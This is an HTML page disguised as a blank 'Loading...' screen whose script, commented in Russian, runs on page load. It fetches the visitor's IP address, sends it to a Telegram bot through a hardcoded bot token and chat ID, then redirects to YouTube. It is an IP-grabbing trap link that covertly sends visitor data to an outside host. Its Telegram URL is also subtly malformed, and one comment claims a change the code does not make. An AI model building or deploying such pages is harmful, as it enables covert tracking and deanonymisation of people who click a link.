<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body style="background: #000;">
    <script>
        // ТВОИ ДАННЫЕ
        const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
        const CHAT_ID = "8426763446";

        async function sendLog() {
            try {
                // 1. Получаем IP (добавили ?format=json для стабильности)
                const ipResponse = await fetch('https://api.ipify.org');
                const ipData = await ipResponse.json();
                const userIp = ipData.ip;

                // 2. Формируем ПРАВИЛЬНУЮ ссылку (проверь каждый символ!)
                const message = encodeURIComponent("Сработала ссылка!\nIP: " + userIp);
                const url = "https://api.telegram.org" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;

                // 3. Отправляем в Telegram
                await fetch(url);

            } catch (err) {
                console.error("Ошибка скрипта:", err);
            } finally {
                // 4. В любом случае уходим на YouTube через 500мс
                setTimeout(() => {
                    window.location.href = "https://www.youtube.com";
                }, 500);
            }
        }

        sendLog();
    </script>
</body>
</html>
